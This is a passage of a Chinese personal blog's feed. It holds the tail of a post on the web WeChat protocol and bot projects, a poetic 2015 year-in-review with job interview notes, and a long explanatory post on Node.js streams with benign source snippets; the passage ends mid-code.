class="string">'wechatapp.com'</span>, o = <span class="string">'file.wechatapp.com'</span>, n = <span class="string">'webpush.wechatapp.com'</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>一大堆域名。。不过似乎没有太大区别。非通过qq注册的微信用户使用wechat-user-bot暂时也没问题。</p>
<h2 id="参考资料">参考资料</h2><ul>
<li><a href="http://stackoverflow.com/questions/3687729/who-add-single-underscore-query-parameter" target="_blank" rel="external">Who Add “_” Single Underscore Query Parameter?</a></li>
<li><a href="http://www.blogjava.net/yongboy/archive/2014/03/05/410636.html" target="_blank" rel="external">微信协议简单调研笔记</a></li>
<li><a href="https://github.com/xiangzhai/qwx" target="_blank" rel="external">qwx by xiangzhai</a></li>
<li><a href="https://github.com/LeMasque/uProxy_wechat/blob/master/wechat.js" target="_blank" rel="external">uproxy-wechat</a></li>
</ul>
<p>如果你喜欢python3 的asyncio</p>
<ul>
<li><a href="https://github.com/lyyyuna/wechat_robot" target="_blank" rel="external">wechat_robot with python 3.5 asyncio by lyyyuna</a></li>
</ul>
<p>如果你对微信机器人的作用感兴趣</p>
<ul>
<li><a href="http://wxrobot.53ws.cn/logout" target="_blank" rel="external">lu4kd0y开发的似乎是开发给微商用的微信云机器人(请自行判断安全性)</a></li>
</ul>
<h2 id="2016-3-7更新">2016.3.7更新</h2><p>首先，lu4kd0y的微信云机器人开源了！！–&gt; <a href="https://github.com/lu4kyd0y/WeChat-Cloud-Robot" target="_blank" rel="external">微信云端机器人框架</a></p>
<p>其次，看到了更多优秀的关于web微信的hack</p>
<ul>
<li>MaskRay的<a href="https://github.com/MaskRay/wechatircd" target="_blank" rel="external">wechatircd</a></li>
<li>stonexer的<a href="https://github.com/nodeWechat/wechat4u" target="_blank" rel="external">wechat4u</a>和<a href="https://github.com/stonexer/wechatBot" target="_blank" rel="external">wechatBot</a></li>
<li>feit的<a href="https://github.com/feit/Weixinbot" target="_blank" rel="external">WeixinBot</a></li>
<li>还有geeeeeeek的<a href="https://github.com/geeeeeeeeek/electronic-wechat" target="_blank" rel="external">electronic-wechat</a></li>
<li>Urinx的<a href="https://github.com/Urinx/WeixinBot" target="_blank" rel="external">WeixinBot</a></li>
<li>某同学的userscript和chrome扩展</li>
</ul>
<p>最后，昨天发现web微信更新了。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="协议分析">协议分析</h2><p>我使用firefox浏览器调试工具，查看浏览器通信及美化web微信javascript代码。非常好用，没出现Chromium中文乱码的问题。</p>
<h3 id="登录">登录</h3><h4 id="获取uuid">获取uu]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="protocol" scheme="http://reverland.org/tags/protocol/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[我的2015]]></title>
    <link href="http://reverland.org/life/2016/01/02/2015-summary-and-prospect/"/>
    <id>http://reverland.org/life/2016/01/02/2015-summary-and-prospect/</id>
    <published>2016-01-02T03:02:21.000Z</published>
    <updated>2016-01-08T09:14:49.795Z</updated>
    <content type="html"><![CDATA[<h2 id="概要">概要</h2><p>2015回顾与2016展望。删删写写，写写删删。终于是心力交瘁，不能写下想写的，难以隐去不想写的。</p>
<p>最后都删了算了。留下歪诗残句破图将一年寄寓其中。</p>
<p>可怜无穷宇宙之一粒微尘，浑浑一年，一切五蕴六尘十二因缘梦幻泡影，却想把它刻在永恒之石上。</p>
<h2 id="歪诗">歪诗</h2><blockquote>
<p>冬日阳光下，仿佛自由喵。悄悄细凝望，不敢惊来人。</p>
<p>——图书馆南阶梯上看见晒太阳的猫, 2015.1.16</p>
<p>日暖微风犹冷，又是一年春深。缸小鱼闲自浮沉，隔窗人流看困。<br>寒暑交替不息，所送岂是他人。他年是君今年身，新词无奈旧恨。</p>
<p>——西江月，忆与康神邮局远寄行李独观缸中之鱼。2016.4</p>
<p>独对窗前半城绿，忆急前日风雨。水电泪痕未拂尽，桌前昨日雨，隔空今朝云。长夜头疼几多醒，是去是来望归期。今夕晚雨如期至？三分茫然七分念，十分不舍，九分晴.</p>
<p>教三612别校之家，2015.7.26</p>
<p>层峦似翠褶，夕照如金衣。蜿蜒忽高阔，待月京城西。云浓暮色重，夜暗阡陌齐。浮心映明月，空山听雨滴。</p>
<p>——中秋夜白塔山与羊、苗待月，2015.9.28</p>
<p>晴空云定静如水，永夜星动渺似梦。莫叹高远无穷尽，眼前画过也无缘。</p>
<p>——夜起观流星雨未见，2015.12.18</p>
<p>寒雾叠京城，层霾蓟门东。无风却冷涕泗横，不是别重是寒重。车来车无影，醉醒梦中梦。愿君南为新前程，独循街边听车声。</p>
<p>——送宋少甫之任岳州，2015.12.26</p>
</blockquote>
<h2 id="书痕">书痕</h2><ul>
<li>红楼梦</li>
<li>金瓶梅</li>
<li>道德经</li>
<li>庄子</li>
<li>计算机程序的构造和解释</li>
<li>Eloquent Javascript</li>
<li>You Don’t Know JS</li>
<li>心经</li>
<li>金刚经</li>
<li>华严经</li>
<li>菜根谭</li>
<li>人生的枷锁</li>
</ul>
<h2 id="健身">健身</h2><ul>
<li>游泳</li>
<li>瞎逛</li>
<li>慢跑 </li>
<li>滑雪</li>
<li>其他拉伸与活动</li>
</ul>
<h2 id="工作">工作</h2><ul>
<li>腾讯：实习安全一面，校招前端三面。感谢初面面试官wlj对我的认可，感谢把错过二面的我硬加到面试官那里的HR姐姐。</li>
<li>领英：前端三面，如果算上HR交谈四面。谢谢<a href="http://armsword.com/" target="_blank" rel="external">armsword</a>、<a href="http://qoshi.me" target="_blank" rel="external">qoshi</a>的内推，谢谢介右的两次面试。</li>
<li>Keep：Web开发一面。谢谢，面试官愿意帮内推其他地方前端真是很荣幸。当时怎么没问下面试官怎么称呼，不过也许也知道是谁吧。</li>
<li>阿里：安全两面前端两面。谢谢翔哥和素未谋面的李冬萌师兄内推。</li>
<li>360：web前端四面。谢谢<a href="https://github.com/notifications" target="_blank" rel="external">akira-cn</a>给的实习面试机会，谢谢手机助手面试官的认可。</li>
<li>美团：web前端两面。现在想起来二面的面试官，真觉得是个温柔善良的人。</li>
<li>优分期: web前端零面，和HR没达成一致。谢谢周老板的内推。</li>
<li>微软：感谢<a href="https://ichon.me/" target="_blank" rel="external">chon</a>的内推。</li>
<li>谷歌：被笔试吊打。</li>
<li>红帽：并没校招。。。谢谢Bruno，Jim Ma邀请去JBoss Usergroup，关于web微服务真是大开眼界。一下成为乐Java粉哈哈哈。</li>
<li>大众点评：无回应。</li>
</ul>
<p>还要谢谢网信金融的魏蒙，几次关心过我的<a href="https://github.com/sbilly" target="_blank" rel="external">sbilly</a>，肯帮我内推永信至诚的北邮天枢Teacher G，给了我他所在学校研究生院在招聘消息的芦老师，搜狗的lka同学，今日头条的<a href="https://github.com/qiukun" target="_blank" rel="external">邱神</a>等等。</p>
<h2 id="其他">其他</h2><ul>
<li>瞎画</li>
<li>作图和修图</li>
<li>瞎写</li>
<li>瞎唱</li>
<li>瞎跳</li>
<li>骑车瞎逛</li>
</ul>
<h2 id="愿望">愿望</h2><ul>
<li>去执</li>
<li>道法自然</li>
<li>见心明性</li>
<li>照顾好自己</li>
<li>进而能照顾他人</li>
</ul>
<p>为了我热爱的生命、世界和你们。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="概要">概要</h2><p>2015回顾与2016展望。删删写写，写写删删。终于是心力交瘁，不能写下想写的，难以隐去不想写的。</p>
<p>最后都删了算了。留下歪诗残句破图将一年寄寓其中。</p>
<p>可怜无穷宇宙之一粒微尘，浑浑一年，一切五蕴六尘十二因缘梦幻]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Stream in NodeJS]]></title>
    <link href="http://reverland.org/javascript/2015/12/20/stream-in-nodejs/"/>
    <id>http://reverland.org/javascript/2015/12/20/stream-in-nodejs/</id>
    <published>2015-12-20T14:04:00.000Z</published>
    <updated>2016-01-02T02:07:27.008Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>流是Node中最好也最被误解的概念。</p>
<p>–<a href="https://github.com/dominictarr/event-stream" target="_blank" rel="external">dominictarr</a></p>
</blockquote>
<p>当我第一次接触NodeJS时，NodeJS有很不一样的感觉。异步、流、神奇的Javascript等等等等，花了将近几个月时间才渐渐理解其中很多概念。流就是其中一个开始很难以理解也很让人好奇的东西，而流在NodeJS中又是无处不在的。</p>
<p>后来，抱着好奇心翻看流的文档、翻看实现的代码，搜索网络上的文章，调了调流的代码看看它怎么运作的，看看别人做的实验。</p>
<p>感觉：</p>
<ol>
<li>流是个在发展的模式。</li>
<li>状态管理和反压控制流速细节非常麻烦。</li>
</ol>
<p>本文是一堆笔记堆砌而成，也算个资料汇编吧。</p>
<h2 id="模型">模型</h2><p>添油加醋意译自<a href="https://streams.spec.whatwg.org/#model" target="_blank" rel="external">Streams Living Standard</a></p>
<blockquote>
<p>程序皆模型。这些模型脱胎于现实或精神过程，于头脑中孕育。这些过程，源于人类经验和思考，数量庞大，结构复杂，从来都只被部分理解。</p>
<p>–<a href="https://mitpress.mit.edu/sicp/full-text/book/book-Z-H-5.html#%_chap_Temp_2" target="_blank" rel="external">Structure and Interpretation of Computer Programs(second edition), Foreword</a></p>
</blockquote>
<p>程序是我们心智的模型，是我们对世界的认识。</p>
<p>异步非阻塞IO是、观察者模式、单例是，所有计算机科学中天花乱坠的东西概莫能外。</p>
<p>NodeJS中看到的流也是。大道筑于流：其生灭变换于无穷之时间，不困于有限之空间。</p>
<h3 id="数据块(Chunk)">数据块(Chunk)</h3><p>数据块： 每次读入或写入的一段数据，可以是任何类型。</p>
<h3 id="读取流(Readable_Streams)">读取流(Readable Streams)</h3><p>读取流: 代表数据源的模型，数据的来源。<br>潜在资源(underlying source)：读取流所封装的底层I/O源<br>推送源(push sources): 无论如何都在将数据推出的源。也许提供了暂停和恢复的功能。<br>拉取源(pull sources): 需要有消费数据的对象从他们中请求数据的源。<br>队列(queue): 潜在资源将数据块推入流内部队列，这些数据块可以通过流的公共接口一次一个读出。<br>消费者(Consumer): 使用读取流的公共接口从其读取数据的程序。<br>取消(cancel): 消费者能够取消读取流。当其不再对流中数据有兴趣，立即关闭流，放弃任何队列中的数据块，执行任何潜在资源的取消机制。<br>分流(tee): 消费者能够复制读取流。锁定流使其不再直接可用，创建两个新的能独立消费的分支(branches)。</p>
<h3 id="写入流(Writable_Streams)">写入流(Writable Streams)</h3><p>写入流： 代表数据的目的地，数据的流向处。</p>
<p>潜在汇入(underlying sink)： 写入流所封装的底层I/O汇入点。写入流通过将之后的写入缓存到队列中，一次传递一个给潜在汇入，来抽象底层汇入的复杂实现。数据块被一次一个地通过写入流的公共接口传递给潜在汇入。</p>
<p>供给者(producer): 通过使用写入流的公共接口将数据写入的代码为供给者。</p>
<p>终止(abort): 供给者有能力终止写入流。如果供给者认为有错误，任何之后的写入都应该被禁止，可以将写入流转换到错误状态而无需潜在汇入的信号。</p>
<h3 id="转换流(Transform_Streams)">转换流(Transform Streams)</h3><p>转换流包含一对流：一个写入流，一个读取流。数据写入写入流，处理转换后，将可以从读取流读取新数据。</p>
<h3 id="管道(Pipe)链(Chains)和反压(Backpressure)">管道(Pipe)链(Chains)和反压(Backpressure)</h3><p>管道: 流一个接一个好像管道一样连接起来，比如一个读取流连接上写入流。这些流可以一个接一个连接起来。</p>
<p>管道链： 一系列像管道一样连接的流成为管道链。</p>
<p>初始源(original source): 是链中第一个读取流所代表的潜在资源。</p>
<p>终点汇入(ultimate sink): 是链中最后一个写入流代表的潜在资源。</p>
<p>反压: 一旦管道链建立起来，就可以传播流速信号。如果任何链中环节还不能接受数据块，就将该信号反向传回初始源，告知其不要这么快生成数据。这种根据链中数据处理速度将信号反馈给初始源的过程叫做反压。</p>
<p>如果分裂一个读取流，两个分支的反压信号将聚合，任何一个分支有反压信号将被传送给读取流的潜在资源。</p>
<h3 id="内部队列和队列策略">内部队列和队列策略</h3><p>读取流和写入流都维护一个内部队列(internal queues)。他们有相似的目的。在读取流中，内部队列缓存了潜在来源推入队列的数据。在写入流中，内部队列缓存了将要传递给潜在汇入还未来得及被其处理的数据。</p>
<p>队列策略(queuing strategy)是一种决定流如何根据它的内部状态给出反压信号的策略。队列策略赋给每个数据块一个尺寸，比较队列中所有数据块总体尺寸和一个特殊的叫做水平标记(high water mark)的值做比较。结果之差，即水平标记减去数据块总尺寸，用来决定填入流队列中意向尺寸(desired size to fill the stream’s queue。</p>
<p>   流意向读取的尺寸 = 水平标记 - 队列中已有数据块总大小</p>
<p>对读取流来说，一个潜在来源可以使用该意向作为反压信号，减慢数据块生成速度来保持意向读取尺寸大于等于零。</p>
<p>对写入流来说，供给源可以类似避免写入速度过快。</p>
<p>简单例子，如果每个数据块尺寸为1，水平标志为3，在流考虑应用反压之前流中队列最多有三个数据块。</p>
<h3 id="锁定(Locking)">锁定(Locking)</h3><p>读取流读者(readable stream reader)是允许直接从读取流中读取数据块的对象。没有这个对象，消费者只能对读取流进行高级操作：等待流关闭或者出错，取消流，用管道将读取流连接上写入流。许多这些高级操作实际自身使用流读者。</p>
<p>给定的流一次只能有一个读者。叫做流被锁定到读者(locked to the reader)，读者被成为激活的(active)。</p>
<p>读者也有能力释放它的锁(release its read lock)，让其不再激活。其他读者可以自由获取这个锁。如果流因为潜在来源或这取消而关闭或出错，读者将自动释放锁。</p>
<h2 id="Stream_in_NodeJS">Stream in NodeJS</h2><p>本章翻译整理自<a href="https://brycebaril.github.io/streams2-presentation/" target="_blank" rel="external">Streams2 Node.js Streams2 Demystified. by Bryce Baril</a></p>
<p>Stream可以看作是一种数据处理惰性求值(lazy evaluation)。</p>
<h3 id="好处">好处</h3><ul>
<li>延迟处理缓冲的数据</li>
<li>时间驱动非阻塞</li>
<li>内存消耗低</li>
<li>自动 back-pressure 处理</li>
<li>突破 V8 堆内存限制</li>
<li>NodeJS 核心结构</li>
</ul>
<h3 id="Classes">Classes</h3><p>五个类</p>
<ul>
<li>Readable: 读出</li>
<li>Writable: 写入</li>
<li>Duplex: 双向流</li>
<li>Transform: 流变形</li>
<li>Passthrough: 流间谍</li>
</ul>
<h4 id="Readable实现">Readable实现</h4><ol>
<li>集成<code>stream.Readable</code></li>
<li>实现<code>_read(size)</code>方法</li>
</ol>
<p>or</p>
<p>简化Constructor</p>
<h5 id="_read(size)">_read(size)</h5><p><code>size</code>是字节，可以忽略（尤其对 objectMode 的流）。</p>
<p><code>_read(size)</code>中必须调用<code>this.push(chunk)</code>把数据推入读取队列。只有数据消耗者出现的时候才被调用（read或者pipe）。</p>
<h5 id="readable_options">readable options</h5><p><code>highWaterMark</code>number:内部缓冲区读取的最大字节大小限制，默认为16kb<br><code>encoding</code>String: 字符编码，默认为 null<br><code>objectMode</code>Boolean: 使用 Javascript 对象代替 Buffer 或字符串</p>
<h5 id="使用_Readable_流">使用 Readable 流</h5><ul>
<li><code>readable.pipe(target)</code></li>
<li><code>readable.read(size)</code></li>
<li><code>readable.on(&quot;data&quot;, /*...*/)</code></li>
</ul>
<h4 id="Writable">Writable</h4><h5 id="实现_Writable">实现 Writable</h5><ol>
<li>继承<code>stream.Writable</code></li>
<li>实现<code>_write(chunk, encoding, callback)</code>方法</li>
</ol>
<p>or</p>
<p>简化Constructor</p>
<h5 id="_write(chunk,_encoding,_callback)">_write(chunk, encoding, callback)</h5><h5 id="Writable_Options">Writable Options</h5><ul>
<li><code>highWaterMark</code>number: </li>
<li><code>decodeStrings</code>Boolean:是否在传递给<code>_write()</code>之前将string decode到buffer</li>
</ul>
<h5 id="使用Writable">使用Writable</h5><ul>
<li><code>source.pipe(writable)</code></li>
<li><code>writable.write(chunk[, encoding, callback])</code></li>
</ul>
<p>如果write 返回false则需要监听<code>drain</code>事件</p>
<h4 id="Duplex">Duplex</h4><p>双工</p>
<h5 id="实现">实现</h5><ol>
<li>继承<code>stream.Duplex</code></li>
<li>实现<code>_read(size)</code>方法</li>
<li>实现<code>_write(chunk, encoding, callback)</code>方法</li>
</ol>
<p>or</p>
<p>简化Constructor</p>
<h5 id="options">options</h5><p>Readable和Writable的超集</p>
<h5 id="使用">使用</h5><ul>
<li>input.pipe(duplex)</li>
<li>duplex.pipe(output)</li>
<li>duplex.on(‘data’, /<em>…</em>/)</li>
<li>duplex.write()</li>
<li>duplex.read()</li>
</ul>
<h4 id="Transform">Transform</h4><p>操作流中数据，特殊双工流</p>
<h5 id="实现-1">实现</h5><ol>
<li>继承<code>stream.Transform</code></li>
<li>实现<code>_transform(chunk, encoding, callback)</code>方法</li>
<li>可选实现<code>_flush(callback)</code>方法</li>
</ol>
<p>or</p>
<p>简化Constructor</p>
<h5 id="_transform(chunk,_encoding,_callback)方法">_transform(chunk, encoding, callback)方法</h5><ul>
<li>调用<code>this.push(something)</code>传递给下一个消费者</li>
<li>如果不push任何东西，将略过一个chunk</li>
<li>必须在每次<code>_transform</code>被调用时调用一次<code>callback</code></li>
</ul>
<h5 id="_flush(callback)">_flush(callback)</h5><p>当流结束时，有一次清理和最后<code>this.push()</code>调用来清理任何缓冲或工作的机会。结束时调用<code>callback()</code>。</p>
<h5 id="transform_options">transform options</h5><p>依然是读写流的超集</p>
<h5 id="使用transform流">使用transform流</h5><p>所有读写流方法</p>
<ul>
<li>source.pipe(transform).pipe(drain)</li>
<li>transform.on(‘data’, /<em>…</em>/)    </li>
</ul>
<h4 id="Passthrough">Passthrough</h4><p>大多passthrough流用来测试，是没有变幻的transform流</p>
<h3 id="Buffering">Buffering</h3><p>Streams 自动处理缓冲和 backpressure</p>
<h4 id="readable_buffering">readable buffering</h4><p>当你调用<code>this.push(chunk)</code>时缓冲，知道流被读取</p>
<h4 id="写缓冲">写缓冲</h4><p>写入时缓冲，流被读取或处理时排空</p>
<h4 id="stream-read(0)">stream.read(0)</h4><p>在可读流上调用<code>.read(0)</code>更新系统而不读取任何数据。一般不会用</p>
<p>有时候你想要触发潜在读取流机制，而不处理任何数据</p>
<p>如果内部缓冲区在最高吃水线(highWaterMark)之下，流当前并不被读。这时候调用<code>read(0)</code>将触发底层<code>_read</code>调用。</p>
<h4 id="stream-push(‘’)或者stream-push(null)">stream.push(‘’)或者stream.push(null)</h4><p>推入一个0字节字符或者对象模式中推入null会结束流。会触发状态，将触发Readable Stream的readable事件。</p>
<h3 id="错误处理">错误处理</h3><p>Stream是EventEmitter。要么监听<code>error</code>事件，要么就让它们冒泡</p>
<h4 id="传递错误">传递错误</h4><p>当error发生时，将错误放在<code>_write</code>或<code>_transform</code>里callback的第一个参数来结束流和给出错误信号。</p>
<h2 id="历史">历史</h2><p>然而Stream既不是凭空来的，也不是提前设计好的，是一步一步进化出来的并仍在不断进化。Isaac曾经这样说：</p>
<blockquote>
<p>贯穿整个Node的开发，我们都在逐渐迭代一个理想的基于事件的数据处理API。这就是你们所看到的渗透到Node核心模块和无数npm中模块的 Stream 接口。</p>
<p>–<a href="https://nodejs.org/en/blog/feature/streams2/" target="_blank" rel="external">A New Streaming API for Node v0.10, Isaac Z. Schlueter, 2012-12-21</a></p>
</blockquote>
<p>那么，NodeJS中的流是怎样进化的呢？</p>
<h3 id="Stream_1">Stream 1</h3><p>最早的Stream是从http.js和net.js模块抽象出来，说明其源头正是因处理网络而生。参见<a href="https://github.com/nodejs/node/commit/bc695475b908ccf30e5016689328df37b678b870" target="_blank" rel="external">Add Stream Base class with stream.pipe, ry committed on 11 Oct 2010</a></p>
<p>这时候的Stream是朴素的基础类，仅仅从EventEmitter继承而来，有一个<code>pipe</code>方法，实现从src读取数据写入dest的功能。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Stream</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  events.EventEmitter.call(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">inherits(Stream, events.EventEmitter);</span><br><span class="line">exports.Stream = Stream;</span><br><span class="line"></span><br><span class="line">Stream.prototype.pipe = <span class="function"><span class="keyword">function</span> (<span class="params">dest, options</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> source = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">source.on(<span class="string">"data"</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">false</span> === dest.write(chunk)) source.pause();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">dest.on(<span class="string">"drain"</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (source.readable) source.resume();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>pipe实现了一种简单的流量管理。有数据时，就往dest写入。而dest.write如果返回false就表示dest无法及时处理数据，将source暂停(pause)。一旦dest的缓冲区为空，drain事件触发，如果src是可读的，就恢复(resume)src。看上去似乎很好。</p>
<p>接下来，几经修修改改，增增减减，没有太大变化。</p>
<p>这时的Stream有<a href="https://nodejs.org/en/blog/feature/streams2/" target="_blank" rel="external">四个特点</a>：</p>
<ul>
<li><code>pause</code>是建议性质的，并不一定真能暂停</li>
<li><code>data</code>事件不管你准备没准备好都会发生</li>
<li>没法处理特定数目的数据然后将剩下的数据交给其他部分处理</li>
<li>实现流难到极点，需要顾及缓冲、暂停、恢复、数据事件、状态等等。缺少共享的类致使反复解决同样的问题，产生同样的错误和相似的bug。</li>
</ul>
<h3 id="Stream_2">Stream 2</h3><p>两年后，Node 0.10 发布，Stream 2 应运而生。参见<a href="https://github.com/nodejs/node/commit/420e07c5777bdb2e493147d296abfc102f725015" target="_blank" rel="external">streams2: The new stream base classes , isaacs committed on 3 Oct 2012</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">util.inherits(Stream, events.EventEmitter);</span><br><span class="line"><span class="built_in">module</span>.exports = Stream;</span><br><span class="line">Stream.Readable = <span class="built_in">require</span>(<span class="string">'_stream_readable'</span>);</span><br><span class="line">Stream.Writable = <span class="built_in">require</span>(<span class="string">'_stream_writable'</span>);</span><br><span class="line">Stream.Duplex = <span class="built_in">require</span>(<span class="string">'_stream_duplex'</span>);</span><br><span class="line">Stream.Transform = <span class="built_in">require</span>(<span class="string">'_stream_transform'</span>);</span><br><span class="line">Stream.PassThrough = <span class="built_in">require</span>(<span class="string">'_stream_passthrough'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Backwards-compat with node 0.4.x</span></span><br><span class="line"><span class="comment">// Backwards-compat with node 0.4.x</span></span><br><span class="line">Stream.Stream = Stream;</span><br><span class="line">Stream.Stream = Stream;</span><br></pre></td></tr></table></figure>
<p>提供了五种基本流类，还提供原始的Stream以兼容旧版。这几种基本类提供了强大的抽象，但也给nodejs的核心模块带来了巨大的复杂度。Stream一跃成为NodeJS核心模块中最复杂的部分之一。以至于社区内有很多人认为，应该将<a href="https://r.va.gg/2014/06/why-i-dont-use-nodes-core-stream-module.html" target="_blank" rel="external">这些模块分离维护</a>以维持NodeJS较小的稳定核心。</p>
<p>但不管怎么说，托Stream 2的福，用户实现流简单很多。Stream 2的流API也着重解决Stream 1 的一些问题。将Push stream改成Pull stream。</p>
<p>之后，Stream2全面更新NodeJS其他核心模块。在实践中增增减减。稳定成如下形式：</p>
<p>当流的缓冲队列内有数据时会触发<code>readable</code>事件，流通过<code>read</code>读取潜在资源推入缓冲队列中的数据块。这样，就可以指定想要读取的数据大小。</p>
<p>为了兼容，可以通过<code>data</code>事件继续使用Stream 1的api，当监听<code>data</code>事件时会取消流的暂停状态。</p>
<p>stream2还有很多细节。NodeJS团队为了更优雅的流量控制和更高的效率，不断锤炼Stream 2的设计和实现。接口和设计频繁变化，lowWaterMark特性被移除，push和unshift被加入，_read()不再接受回调，read(0)频繁变化，实现自动扩展的highWaterMark、<a href="https://github.com/nodejs/node/commit/444bbd4fa7315423a6b55aba0e0c12ea6534b2cb" target="_blank" rel="external">添加ObjectMode</a>等等，同时其他使用stream的核心模块也渐渐使用新的stream类。</p>
<p>比较重要的API倒不多，比如readable stream除了<code>stream.read()</code>。有当流想要拉取更多数据时调用的<code>stream._read</code>(实际上就是read调用的)。有操作缓冲队列的<code>stream.push</code>和<code>stream.unshift</code>。</p>
<p>这时的stream，push和pull stream两种模式不能同时使用，<code>read()</code>时并不会触发相应的<code>data</code>事件。</p>
<p>修修改改修修改改。</p>
<p>2014年12月，贡献者因对NodeJS开发公司Joyent在NodeJS管理上的长期不满，社区分裂。15年1月，iojs发布。</p>
<h3 id="Stream_3">Stream 3</h3><p><a href="https://github.com/nodejs/node/blob/master/CHANGELOG.md#streams" target="_blank" rel="external">Summary of changes from Node.js v0.10.35 to io.js v1.0.0</a>里写道：这次流的变化没有从streams1倒streams2这么大：他们都是从现存的想法中提炼出来的，这些设计应该让人类更少意外，让计算机能更快处理。最终所有这些改变, 成为了stream3，但大部分改变将不会被流消费者和实现者察觉。</p>
<p>也就是说，Streams 3是两者的结合，两者将更加一致与和谐。比如读取流不再只能从非flowing状态转移到flowing状态而不可逆，<code>read()</code>也将触发<code>data</code>事件。</p>
<p>Changelog里<a href="https://cloud.githubusercontent.com/assets/37303/5728694/f9a3e300-9b20-11e4-9e14-a6938b3327f0.png" target="_blank" rel="external">一副图完整描绘了Stream 3</a></p>
<p>修修补补修修补补。</p>
<p>stream的API仍然非常复杂，社区创造了through等来简化流的创建。终于，官方实现了<a href="https://github.com/nodejs/node/commit/50daee7243a3f987e1a28d93c43f913471d6885a" target="_blank" rel="external">简化版的流构建(construction)</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options &amp;&amp; <span class="keyword">typeof</span> options.read === <span class="string">'function'</span>)</span><br><span class="line">  <span class="keyword">this</span>._read = options.read;</span><br></pre></td></tr></table></figure>
<p>就是上面这种黑魔法。。。</p>
<p>顺便说到黑魔法，isaac实现的扩展highWaterMark<a href="https://github.com/nodejs/node/commit/9208c890582305218716a2bdadb7461ef24f5830" target="_blank" rel="external">stream: Raise readable high water mark in powers of 2 </a>。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">roundUpToNextPowerOf2</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &gt;= MAX_HWM) &#123;</span><br><span class="line">    n = MAX_HWM;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Get the next highest power of 2</span></span><br><span class="line">    n--;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> p = <span class="number">1</span>; p &lt; <span class="number">32</span>; p &lt;&lt;= <span class="number">1</span>) n |= n &gt;&gt; p;</span><br><span class="line">    n++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2015年8月21日，<a href="https://github.com/nodejs/node/commit/1c6e014bfa" target="_blank" rel="external">更新了这么一个微优化</a>。。。第一眼看去我擦咧这是啥？！直觉似乎hackers delight里会有这种东西，<a href="https://en.wikipedia.org/wiki/Power_of_two#cite_note-8" target="_blank" rel="external">果然</a>。。。这也是神奇的算法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">computeNewHighWaterMark</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &gt;= MAX_HWM) &#123;</span><br><span class="line">    n = MAX_HWM;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Get the next highest power of 2</span></span><br><span class="line">    n--;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">4</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">8</span>;</span><br><span class="line">    n |= n &gt;&gt;&gt; <span class="number">16</span>;</span><br><span class="line">    n++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span 